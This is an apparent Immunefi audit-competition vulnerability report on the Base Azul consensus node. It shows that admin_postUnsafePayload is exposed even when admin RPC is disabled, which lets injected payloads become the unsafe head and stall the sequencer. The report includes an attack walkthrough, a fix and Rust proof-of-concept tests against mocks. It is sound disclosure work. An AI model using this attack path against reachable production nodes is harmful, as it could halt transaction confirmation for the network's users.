# 75432 bc insight attacker can force unsafe head adoption through admin postunsafepayload even when admin rpc is not enabled

**Submitted on Apr 29th 2026 at 04:33:34 UTC by @p\_laksmana for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #75432
* **Report Type:** Blockchain/DLT
* **Report severity:** Insight
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Brief/Intro

In the current Base Azul `base-consensus` implementation, the consensus RPC CLI exposes a `BASE_NODE_RPC_ENABLE_ADMIN` / `--rpc.enable-admin` flag that appears intended to gate the admin RPC namespace. However, in the full `base-consensus node` service path, the admin RPC module is merged whenever the internal `network_admin` channel exists. The code never checks `RpcBuilder.enable_admin` before registering the admin namespace.

As a result, a normal Base Azul full node can expose `admin_postUnsafePayload` even when the operator did not enable the admin API.

Once reachable, `admin_postUnsafePayload` accepts an arbitrary `BaseExecutionPayloadEnvelope` and forwards it into the node's unsafe-block path. The path does not require a sequencer client, does not verify an unsafe-block signer, and does not require the payload to arrive through signed consensus gossip. If the execution layer returns `Valid`, the production `InsertTask` imports the payload, runs forkchoice synchronization, and updates the node's unsafe head to the attacker-supplied block.

For example:

1. Operator runs Base Azul `base-consensus node` with RPC enabled but without `BASE_NODE_RPC_ENABLE_ADMIN=true`.
2. The full node service still passes `network_admin: Some(net_admin_rpc)` into `RpcActor`.
3. `RpcActor` merges `AdminRpc` because `network_admin` is `Some`.
4. Attacker reaches the consensus RPC listener and calls `admin_postUnsafePayload`.
5. The attacker supplies a valid-looking but attacker-controlled `BaseExecutionPayloadEnvelope`.
6. The payload is forwarded to `engine_client.send_unsafe_block(payload)`.
7. The engine path creates an `InsertTask`.
8. If `engine_newPayload` and `engine_forkchoiceUpdated` return `Valid`, the node adopts the attacker-controlled block as its unsafe head.

## Vulnerability Details

The CLI defines the admin flag and stores it in `RpcArgs`.[`crates/client/cli/src/rpc.rs#L24-L32`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/client/cli/src/rpc.rs#L24-L32)

```rust
/// RPC listening address.
#[arg(long = "rpc.addr", default_value = "0.0.0.0", env = "BASE_NODE_RPC_ADDR")]
pub listen_addr: IpAddr,
/// RPC listening port.
#[arg(long = "port", alias = "rpc.port", default_value = "9545", env = "BASE_NODE_RPC_PORT")]
pub listen_port: u16,
/// Enable the admin API.
#[arg(long = "rpc.enable-admin", env = "BASE_NODE_RPC_ENABLE_ADMIN")]
pub enable_admin: bool,
```

The flag is then copied into `RpcBuilder`.[`crates/client/cli/src/rpc.rs#L69-L78`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/client/cli/src/rpc.rs#L69-L78)

```rust
Some(RpcBuilder {
    no_restart: args.no_restart,
    socket: SocketAddr::new(args.listen_addr, args.listen_port),
    enable_admin: args.enable_admin,
    admin_persistence: args.admin_persistence,
    ws_enabled: args.ws_enabled,
    dev_enabled: args.dev_enabled,
    http_timeout: Duration::from_secs(args.http_timeout_secs),
    max_concurrent_requests: args.max_concurrent_requests,
})
```

`RpcBuilder` contains the `enable_admin` field.[`crates/consensus/rpc/src/config.rs#L7-L16`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/rpc/src/config.rs#L7-L16)

```rust
pub struct RpcBuilder {
    /// Prevent the rpc server from being restarted.
    pub no_restart: bool,
    /// The RPC socket address.
    pub socket: SocketAddr,
    /// Enable the admin API.
    pub enable_admin: bool,
    /// File path used to persist state changes made via the admin API so they persist across
    /// restarts.
    pub admin_persistence: Option<PathBuf>,
```

However, the full node service passes `network_admin: Some(net_admin_rpc)` to the RPC actor whenever the RPC actor is spawned.[`crates/consensus/service/src/service/node.rs#L544-L555`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/service/src/service/node.rs#L544-L555)

```rust
crate::service::spawn_and_wait!(
    cancellation,
    actors = [
        rpc.map(|r| (
            r,
            RpcContext {
                cancellation: cancellation.clone(),
                p2p_network: Some(network_rpc),
                network_admin: Some(net_admin_rpc),
                l1_watcher_queries: l1_query_tx,
            }
        )),
```

Inside `RpcActor::start`, the admin namespace is registered based only on the presence of `network_admin`. The code does not check `self.config.enable_admin`.[`crates/consensus/service/src/actors/rpc/actor.rs#L119-L123`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/service/src/actors/rpc/actor.rs#L119-L123)

```rust
// Build the admin rpc module.
if let Some(network_admin) = network_admin {
    modules
        .merge(AdminRpc::new(self.sequencer_admin_rpc_client, network_admin).into_rpc())?;
}
```

The admin method accepts the unsafe payload and forwards it to the network actor. The comment explicitly says there is no sequencer guard.[`crates/consensus/rpc/src/admin.rs#L70-L81`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/rpc/src/admin.rs#L70-L81)

```rust
async fn admin_post_unsafe_payload(
    &self,
    payload: BaseExecutionPayloadEnvelope,
) -> RpcResult<()> {
    // Note: intentionally no sequencer guard here. Posting an unsafe payload is a P2P/gossip
    // operation that is valid on both sequencer and validator nodes.
    Metrics::rpc_calls("admin_postUnsafePayload").increment(1.0);
    self.network_sender
        .send(NetworkAdminQuery::PostUnsafePayload { payload })
        .await
        .map_err(|_| ErrorObject::from(ErrorCode::InternalError))
}
```

The network actor forwards the admin-posted payload directly to the engine unsafe-block path.[`crates/consensus/service/src/actors/network/actor.rs#L203-L208`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/service/src/actors/network/actor.rs#L203-L208)

```rust
Some(NetworkAdminQuery::PostUnsafePayload { payload }) = self.admin_rpc.recv(), if !self.admin_rpc.is_closed() => {
    debug!(target: "node::p2p", "Forwarding unsafe payload from admin api to engine");
    if self.engine_client.send_unsafe_block(payload).await.is_err() {
        warn!(target: "node::p2p", "Failed to forward admin api unsafe block to engine");
    }
}
```

The downstream engine client turns that payload into `EngineActorRequest::ProcessUnsafeL2BlockRequest`.[`crates/consensus/service/src/actors/network/engine_client.rs#L30-L39`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/service/src/actors/network/engine_client.rs#L30-L39)

```rust
async fn send_unsafe_block(
    &self,
    block: BaseExecutionPayloadEnvelope,
) -> EngineClientResult<()> {
    trace!(target: "network", ?block, "Sending unsafe block to engine.");
    Ok(self
        .engine_actor_request_tx
        .send(EngineActorRequest::ProcessUnsafeL2BlockRequest(Box::new(block)))
        .await
        .map_err(|_| EngineClientError::RequestError("request channel closed.".to_string()))?)
}
```

The engine actor routes that request into the processing queue.[`crates/consensus/service/src/actors/engine/actor.rs#L153-L155`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/service/src/actors/engine/actor.rs#L153-L155)

```rust
EngineActorRequest::ProcessUnsafeL2BlockRequest(envelope) => {
    send_engine_processing_request(EngineProcessingRequest::ProcessUnsafeL2Block(envelope)).await?;
}
```

The engine processor creates a production `InsertTask` for the received payload.[`crates/consensus/service/src/actors/engine/engine_request_processor.rs#L585-L594`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/service/src/actors/engine/engine_request_processor.rs#L585-L594)

```rust
EngineProcessingRequest::ProcessUnsafeL2Block(envelope) => {
    self.log_follower_upgrade_activation(&envelope);
    let task = EngineTask::Insert(Box::new(InsertTask::new(
        Arc::clone(&self.client),
        Arc::clone(&self.rollup),
        *envelope,
        false, /* The payload is not derived in this case. This is an unsafe
                * block. */
    )));
    self.engine.enqueue(task);
}
```

Inside `InsertTask`, once `engine_newPayload` returns a valid or syncing status, the task constructs a new unsafe block reference. When the later forkchoice update is confirmed, this becomes the node's unsafe head.[`crates/consensus/engine/src/task_queue/tasks/insert/task.rs#L120-L141`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/engine/src/task_queue/tasks/insert/task.rs#L120-L141)

```rust
if !self.check_new_payload_status(&response.status) {
    return Err(InsertTaskError::UnexpectedPayloadStatus(response.status));
}
let insert_duration = insert_time_start.elapsed();

let new_unsafe_ref =
    L2BlockInfo::from_block_and_genesis(&block, &self.rollup_config.genesis)
        .map_err(InsertTaskError::L2BlockInfoConstruction)?;

// Send a FCU to canonicalize the imported block.
SynchronizeTask::new(
    Arc::clone(&self.client),
    Arc::clone(&self.rollup_config),
    EngineSyncStateUpdate {
        unsafe_head: Some(new_unsafe_ref),
        local_safe_head: self.is_payload_safe.then_some(new_unsafe_ref),
        safe_head: self.is_payload_safe.then_some(new_unsafe_ref),
        ..Default::default()
    },
)
.execute(state)
.await?;
```

`SynchronizeTask` applies the new sync state when `engine_forkchoiceUpdated` returns `Valid`.[`crates/consensus/engine/src/task_queue/tasks/synchronize/task.rs#L153-L162`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/engine/src/task_queue/tasks/synchronize/task.rs#L153-L162)

```rust
let confirmed =
    self.check_forkchoice_updated_status(state, &valid_response.payload_status.status)?;

// Only apply the sync-state update when the EL confirmed the forkchoice
// (`Valid`).  When the EL returns `Syncing` the block is merely stored —
// advancing `sync_state` here would move `unsafe_head` beyond what the EL
// can serve, creating a gap that breaks derivation consolidation.
if confirmed {
    state.sync_state = new_sync_state;
}
```

Since the admin path bypasses the intended RPC admin gate and does not verify the unsafe-block signer before reaching this engine path, a reachable consensus RPC listener lets the attacker inject an unsafe payload into the same import/canonicalization path used for normal unsafe blocks.

As a result, anyone who can reach the affected Base Azul consensus RPC listener can force that node to adopt an attacker-controlled unsafe head whenever the execution layer accepts the payload as valid.

## Impact Details

This issue can cause attacker-controlled unsafe-head adoption and sequencer confirmation failure in Base-native consensus/offchain.

An attacker who can reach the consensus RPC listener can call `admin_postUnsafePayload` even when `BASE_NODE_RPC_ENABLE_ADMIN` is disabled. The payload enters the unsafe-block import path without sequencer authorization, unsafe-block signer validation, a TEE/ZK proof, or an on-chain transaction. If the execution layer returns `Valid`, production `InsertTask` updates the node's `unsafe_head` to the attacker-supplied block.

If the injected head is inconsistent with the selected L1 origin, the sequencer cannot start new block builds. Production `PayloadBuilder` calls `reset_engine_forkchoice()`, returns `None`, and never calls `start_build_block()`, so no new L2 block build begins while the condition is maintained.

As a result, affected nodes may diverge on unsafe head, and a reachable sequencer can suffer confirmation failure. If the same condition is maintained on the live sequencer path or enough consensus-critical nodes, block production and confirmation may fail network-wide, potentially causing the network to be unable to confirm new transactions.

### Attack Scenario

{% stepper %}
{% step %}

## Attacker identifies a reachable Base Azul consensus RPC listener.

The attacker finds a consensus RPC listener that can be reached.
{% endstep %}

{% step %}

## The operator has not enabled `BASE_NODE_RPC_ENABLE_ADMIN`.

`BASE_NODE_RPC_ENABLE_ADMIN` is disabled.
{% endstep %}

{% step %}

## `RpcActor` still registers the admin namespace.

Because `RpcActor` ignores `RpcBuilder.enable_admin`, the admin namespace is still registered on the full node path.
{% endstep %}

{% step %}

## Attacker calls `admin_postUnsafePayload`.

The attacker invokes the admin method.
{% endstep %}

{% step %}

## Attacker supplies a valid-looking `BaseExecutionPayloadEnvelope`.

The supplied payload is accepted by the RPC method.
{% endstep %}

{% step %}

## `AdminRpc` forwards the payload to `NetworkAdminQuery::PostUnsafePayload`.

The admin RPC forwards the payload into the network layer.
{% endstep %}

{% step %}

## `NetworkActor` forwards the same payload to `engine_client.send_unsafe_block`.

The network actor sends the payload onward.
{% endstep %}

{% step %}

## The engine path creates and runs `InsertTask`.

The unsafe payload enters the production import path.
{% endstep %}

{% step %}

## If the execution layer accepts the payload and the forkchoice update returns `Valid`, the node's unsafe head becomes the attacker-supplied block.

The unsafe head is updated to the injected block.
{% endstep %}

{% step %}

## On the sequencer path, the next `PayloadBuilder::build()` reads that attacker-controlled unsafe head.

The sequencer build path consumes the altered unsafe head.
{% endstep %}

{% step %}

## If the injected head has an inconsistent L1 origin, `PayloadBuilder::get_next_payload_l1_origin()` calls `reset_engine_forkchoice()` and returns `None`.

The sequencer cannot build on an inconsistent L1 origin.
{% endstep %}

{% step %}

## Because `build()` returns `None`, the sequencer does not create an `UnsealedPayloadHandle`.

No payload handle is produced.
{% endstep %}

{% step %}

## Without an `UnsealedPayloadHandle`, the sequencer does not call `start_build_block()`.

Block building does not begin.
{% endstep %}

{% step %}

## Without `start_build_block()`, there is no new execution payload to seal, gossip, or insert as the next unsafe L2 block.

No new block is produced.
{% endstep %}

{% step %}

## While the attacker repeatedly maintains this inconsistent injected head, new user transactions cannot be included in newly built L2 blocks by the affected sequencer.

Transaction inclusion is prevented while the condition persists.
{% endstep %}

{% step %}

## As a result, the affected sequencer fails to confirm new transactions for as long as the condition is maintained.

The sequencer cannot confirm new transactions.
{% endstep %}

{% step %}

## If this condition is maintained on the live sequencer path or enough consensus-critical nodes, block production and confirmation can fail network-wide, causing the network to be unable to confirm new transactions.

Network-wide confirmation failure can occur.
{% endstep %}
{% endstepper %}

## References

* <https://docs.base.org/base-chain/node-operators/base-v1-upgrade?utm\\_source=immunefi>
* [`crates/client/cli/src/rpc.rs#L24-L32`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/client/cli/src/rpc.rs#L24-L32)
* [`crates/consensus/rpc/src/config.rs#L7-L16`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/rpc/src/config.rs#L7-L16)
* [`crates/consensus/service/src/service/node.rs#L544-L555`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/service/src/service/node.rs#L544-L555)
* [`crates/consensus/service/src/actors/rpc/actor.rs#L119-L123`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/service/src/actors/rpc/actor.rs#L119-L123)

## Recomendatation

Gate admin RPC registration on `RpcBuilder.enable_admin`. `network_admin: Some(_)` should only mean the internal channel exists; it must not authorize exposing public admin methods.

## Proof of Concept

### About PoC

* The first test proves downstream unsafe-head adoption. It invokes the real `AdminRpc` handler, receives `NetworkAdminQuery::PostUnsafePayload`, passes the admin-posted payload into production `InsertTask`, configures the execution-layer mock to return `Valid` for `new_payload` and `forkchoiceUpdated`, and asserts that the node's `unsafe_head` becomes the attacker-controlled block.

`admin_posted_payload_can_become_unsafe_head_when_el_returns_valid`

* The second test proves the sequencer confirmation-failure primitive end-to-end. It first uses the real `AdminRpc` handler, then production `InsertTask`, and then production `PayloadBuilder`. After the admin-posted payload becomes the unsafe head, the sequencer build path observes that attacker-controlled head. The selected L1 origin intentionally does not match either the unsafe head's L1 origin hash or parent hash. This follows the production guard inside `PayloadBuilder::get_next_payload_l1_origin`: the sequencer cannot build on an inconsistent L1 origin, so it calls `reset_engine_forkchoice()` and returns `Ok(None)`. The test repeats this condition for three build attempts and asserts that `start_build_block()` is never called.

`admin_payload_causes_sequencer_confirmation_failure_on_inconsistent_head`

### Run PoC

{% stepper %}
{% step %}

## Paste the PoC code below into new file `crates/consensus/service/tests/actors/admin_unsafe_payload_confirmation_failure.rs`

{% endstep %}

{% step %}

## In `base/crates/consensus/service/tests/actors/mod.rs` add this:

```rust
+ mod admin_unsafe_payload_confirmation_failure;
```

{% endstep %}

{% step %}

## Run te POC with

```bash
cargo test -p base-consensus-node --test integration admin_unsafe_payload_confirmation_failure -- --nocapture
```

{% endstep %}
{% endstepper %}

### Output PoC

```bash
cargo test -p base-consensus-node --test integration admin_unsafe_payload_confirmation_failure -- --nocapture

    Finished `test` profile [unoptimized + debuginfo] target(s) in 0.92s
     Running tests/integration.rs (target/debug/deps/integration-07028da320a49e08)

running 2 tests
test actors::admin_unsafe_payload_confirmation_failure::admin_posted_payload_can_become_unsafe_head_when_el_returns_valid ... ok
test actors::admin_unsafe_payload_confirmation_failure::admin_payload_causes_sequencer_confirmation_failure_on_inconsistent_head ... ok

test result: ok. 2 passed; 0 failed; 0 ignored; 0 measured; 8 filtered out; finished in 0.02s
```

### PoC code

```rust
//! PoC: admin-posted unsafe payload can drive `InsertTask` unsafe-head adoption.
//!
//! It proves the concrete impact after
//! `admin_postUnsafePayload` forwards the payload: when the execution layer returns
//! `Valid`, the production `InsertTask` canonicalizes the attacker-supplied payload
//! and updates the node's unsafe head.

use std::sync::{
    Arc,
    atomic::{AtomicUsize, Ordering},
};

use alloy_eips::BlockNumHash;
use alloy_primitives::{B256, Bytes, Sealed, hex};
use alloy_rpc_types_engine::{ForkchoiceUpdated, PayloadId, PayloadStatus, PayloadStatusEnum};
use async_trait::async_trait;
use base_common_consensus::{BaseBlock, BaseTxEnvelope, TxDeposit};
use base_common_rpc_types_engine::{
    BaseExecutionPayload, BaseExecutionPayloadEnvelope, BasePayloadAttributes,
};
use base_consensus_derive::{AttributesBuilder, PipelineResult};
use base_consensus_engine::{
    EngineTaskExt, InsertTask,
    test_utils::{TestEngineStateBuilder, test_block_info, test_engine_client_builder},
};
use base_consensus_genesis::{ChainGenesis, RollupConfig, SystemConfig};
use base_consensus_node::{
    EngineClientResult, L1OriginSelectorError, OriginSelector, PayloadBuilder, RecoveryModeGuard,
    SequencerEngineClient,
};
use base_consensus_rpc::{
    AdminApiServer, AdminRpc, NetworkAdminQuery, SequencerAdminAPIClient, SequencerAdminAPIError,
};
use base_protocol::{AttributesWithParent, BlockInfo, L2BlockInfo};
use tokio::sync::mpsc;

const RAW_BEDROCK_INFO_TX: &[u8] = &hex!(
    "015d8eb9000000000000000000000000000000000000000000000000000000000117c4eb0000000000000000000000000000000000000000000000000000000065280377000000000000000000000000000000000000000000000000000000026d05d953392012032675be9f94aae5ab442de73c5f4fb1bf30fa7dd0d2442239899a40fc00000000000000000000000000000000000000000000000000000000000000040000000000000000000000006887246668a3b87f54deb3b94ba47a6f63f3298500000000000000000000000000000000000000000000000000000000000000bc00000000000000000000000000000000000000000000000000000000000a6fe0"
);

#[derive(Debug)]
struct NoSequencerClient;

#[async_trait]
impl SequencerAdminAPIClient for NoSequencerClient {
    async fn is_sequencer_active(&self) -> Result<bool, SequencerAdminAPIError> {
        unreachable!("postUnsafePayload must not require a sequencer client")
    }

    async fn is_conductor_enabled(&self) -> Result<bool, SequencerAdminAPIError> {
        unreachable!("postUnsafePayload must not require a sequencer client")
    }

    async fn is_recovery_mode(&self) -> Result<bool, SequencerAdminAPIError> {
        unreachable!("postUnsafePayload must not require a sequencer client")
    }

    async fn start_sequencer(&self, _: B256) -> Result<(), SequencerAdminAPIError> {
        unreachable!("postUnsafePayload must not require a sequencer client")
    }

    async fn stop_sequencer(&self) -> Result<B256, SequencerAdminAPIError> {
        unreachable!("postUnsafePayload must not require a sequencer client")
    }

    async fn override_leader(&self) -> Result<(), SequencerAdminAPIError> {
        unreachable!("postUnsafePayload must not require a sequencer client")
    }

    async fn set_recovery_mode(&self, _: bool) -> Result<(), SequencerAdminAPIError> {
        unreachable!("postUnsafePayload must not require a sequencer client")
    }

    async fn reset_derivation_pipeline(&self) -> Result<(), SequencerAdminAPIError> {
        unreachable!("postUnsafePayload must not require a sequencer client")
    }
}

#[derive(Debug)]
struct RecordingSequencerEngineClient {
    unsafe_head: L2BlockInfo,
    reset_count: AtomicUsize,
    start_build_count: AtomicUsize,
}

impl RecordingSequencerEngineClient {
    fn new(unsafe_head: L2BlockInfo) -> Self {
        Self {
            unsafe_head,
            reset_count: AtomicUsize::new(0),
            start_build_count: AtomicUsize::new(0),
        }
    }

    fn reset_count(&self) -> usize {
        self.reset_count.load(Ordering::SeqCst)
    }

    fn start_build_count(&self) -> usize {
        self.start_build_count.load(Ordering::SeqCst)
    }
}

#[async_trait]
impl SequencerEngineClient for RecordingSequencerEngineClient {
    async fn reset_engine_forkchoice(&self) -> EngineClientResult<()> {
        self.reset_count.fetch_add(1, Ordering::SeqCst);
        Ok(())
    }

    async fn start_build_block(&self, _: AttributesWithParent) -> EngineClientResult<PayloadId> {
        self.start_build_count.fetch_add(1, Ordering::SeqCst);
        Ok(PayloadId::default())
    }

    async fn get_sealed_payload(
        &self,
        _: PayloadId,
        _: AttributesWithParent,
    ) -> EngineClientResult<BaseExecutionPayloadEnvelope> {
        unreachable!("sequencer must not reach sealing when L1 origin is inconsistent")
    }

    async fn insert_unsafe_payload(
        &self,
        _: BaseExecutionPayloadEnvelope,
    ) -> EngineClientResult<()> {
        unreachable!("sequencer must not insert a payload when build never starts")
    }

    async fn get_unsafe_head(&self) -> EngineClientResult<L2BlockInfo> {
        Ok(self.unsafe_head)
    }
}

#[derive(Debug)]
struct StaticConflictingOriginSelector {
    expected_l1_hash: B256,
    selected_origin: BlockInfo,
}

#[async_trait]
impl OriginSelector for StaticConflictingOriginSelector {
    async fn next_l1_origin(
        &mut self,
        unsafe_head: L2BlockInfo,
        _: bool,
    ) -> Result<BlockInfo, L1OriginSelectorError> {
        assert_eq!(unsafe_head.l1_origin.hash, self.expected_l1_hash);
        Ok(self.selected_origin)
    }
}

#[derive(Debug)]
struct UnreachableAttributesBuilder;

#[async_trait]
impl AttributesBuilder for UnreachableAttributesBuilder {
    async fn prepare_payload_attributes(
        &mut self,
        _: L2BlockInfo,
        _: BlockNumHash,
    ) -> PipelineResult<BasePayloadAttributes> {
        unreachable!("attributes must not be built when L1 origin validation fails first")
    }
}

fn valid_status() -> PayloadStatus {
    PayloadStatus { status: PayloadStatusEnum::Valid, latest_valid_hash: None }
}

fn valid_fcu() -> ForkchoiceUpdated {
    ForkchoiceUpdated { payload_status: valid_status(), payload_id: None }
}

fn attacker_payload_and_rollup() -> (BaseExecutionPayloadEnvelope, RollupConfig, L2BlockInfo) {
    let block = BaseBlock {
        header: alloy_consensus::Header {
            number: 3,
            parent_hash: B256::from([0x22; 32]),
            timestamp: 1,
            gas_limit: 30_000_000,
            base_fee_per_gas: Some(1),
            ..Default::default()
        },
        body: alloy_consensus::BlockBody {
            transactions: vec![BaseTxEnvelope::Deposit(Sealed::new(TxDeposit {
                input: Bytes::copy_from_slice(RAW_BEDROCK_INFO_TX),
                ..Default::default()
            }))],
            ..Default::default()
        },
    };

    let (execution_payload, _) = BaseExecutionPayload::from_block_slow(&block);

    let rollup = RollupConfig {
        genesis: ChainGenesis {
            l1: BlockNumHash { number: 2, hash: B256::from([4; 32]) },
            l2: BlockNumHash { number: 1, hash: B256::from([5; 32]) },
            system_config: Some(SystemConfig::default()),
            ..Default::default()
        },
        ..Default::default()
    };

    let envelope =
        BaseExecutionPayloadEnvelope { parent_beacon_block_root: None, execution_payload };
    let roundtrip_block: BaseBlock =
        envelope.execution_payload.clone().try_into_block().expect("payload roundtrip");
    let expected_head = L2BlockInfo::from_block_and_genesis(&roundtrip_block, &rollup.genesis)
        .expect("valid L2 block info");

    (envelope, rollup, expected_head)
}

#[tokio::test]
async fn admin_posted_payload_can_become_unsafe_head_when_el_returns_valid() {
    let (payload, rollup, expected_head) = attacker_payload_and_rollup();

    let (admin_tx, mut admin_rx) = mpsc::channel::<NetworkAdminQuery>(8);
    let admin: AdminRpc<NoSequencerClient> = AdminRpc::new(None, admin_tx);

    admin
        .admin_post_unsafe_payload(payload)
        .await
        .expect("admin_postUnsafePayload accepts attacker payload");

    let received = match admin_rx.recv().await.expect("admin query forwarded") {
        NetworkAdminQuery::PostUnsafePayload { payload } => payload,
    };

    let client = Arc::new(
        test_engine_client_builder()
            .with_new_payload_v1_response(valid_status())
            .with_fork_choice_updated_v3_response(valid_fcu())
            .build(),
    );
    let mut state = TestEngineStateBuilder::new()
        .with_unsafe_head(test_block_info(2))
        .with_safe_head(test_block_info(2))
        .with_finalized_head(test_block_info(1))
        .build();
    let before = state.sync_state.unsafe_head();

    let task = InsertTask::new(Arc::clone(&client), Arc::new(rollup), received, false);
    task.execute(&mut state).await.expect("valid attacker payload is inserted");

    let after = state.sync_state.unsafe_head();
    assert_eq!(after, expected_head, "attacker payload became the node unsafe head");
    assert_ne!(after.block_info.hash, before.block_info.hash, "unsafe head hash changed");
    assert!(
        after.block_info.number > before.block_info.number,
        "unsafe head advanced from attacker-controlled admin payload"
    );
}

#[tokio::test]
async fn admin_payload_causes_sequencer_confirmation_failure_on_inconsistent_head() {
    const ATTEMPTS: usize = 3;

    let (payload, rollup, expected_head) = attacker_payload_and_rollup();
    let rollup_for_insert = Arc::new(rollup.clone());

    let (admin_tx, mut admin_rx) = mpsc::channel::<NetworkAdminQuery>(8);
    let admin: AdminRpc<NoSequencerClient> = AdminRpc::new(None, admin_tx);

    admin
        .admin_post_unsafe_payload(payload)
        .await
        .expect("admin_postUnsafePayload accepts attacker payload");

    let received = match admin_rx.recv().await.expect("admin query forwarded") {
        NetworkAdminQuery::PostUnsafePayload { payload } => payload,
    };

    let client = Arc::new(
        test_engine_client_builder()
            .with_new_payload_v1_response(valid_status())
            .with_fork_choice_updated_v3_response(valid_fcu())
            .build(),
    );
    let mut state = TestEngineStateBuilder::new()
        .with_unsafe_head(test_block_info(2))
        .with_safe_head(test_block_info(2))
        .with_finalized_head(test_block_info(1))
        .build();

    let task = InsertTask::new(Arc::clone(&client), rollup_for_insert, received, false);
    task.execute(&mut state).await.expect("valid attacker payload is inserted");

    let attacker_head = state.sync_state.unsafe_head();
    assert_eq!(attacker_head, expected_head, "admin payload became unsafe head first");

    let conflicting_l1_origin = BlockInfo {
        number: attacker_head.l1_origin.number + 1,
        hash: B256::from([0xbb; 32]),
        parent_hash: B256::from([0xcc; 32]),
        timestamp: attacker_head.block_info.timestamp + 12,
    };
    assert_ne!(attacker_head.l1_origin.hash, conflicting_l1_origin.hash);
    assert_ne!(attacker_head.l1_origin.hash, conflicting_l1_origin.parent_hash);

    let sequencer_engine = Arc::new(RecordingSequencerEngineClient::new(attacker_head));
    let mut builder = PayloadBuilder {
        attributes_builder: UnreachableAttributesBuilder,
        engine_client: Arc::clone(&sequencer_engine),
        origin_selector: StaticConflictingOriginSelector {
            expected_l1_hash: attacker_head.l1_origin.hash,
            selected_origin: conflicting_l1_origin,
        },
        recovery_mode: RecoveryModeGuard::new(false),
        rollup_config: Arc::new(rollup),
    };

    for attempt in 1..=ATTEMPTS {
        let result = builder.build().await.expect("inconsistent head is handled as retryable");
        assert!(result.is_none(), "attempt {attempt} must not produce a payload handle");
    }

    assert_eq!(
        sequencer_engine.reset_count(),
        ATTEMPTS,
        "each poisoned unsafe-head attempt resets forkchoice"
    );
    assert_eq!(
        sequencer_engine.start_build_count(),
        0,
        "sequencer must not start a new block while the injected head is inconsistent"
    );
}
```
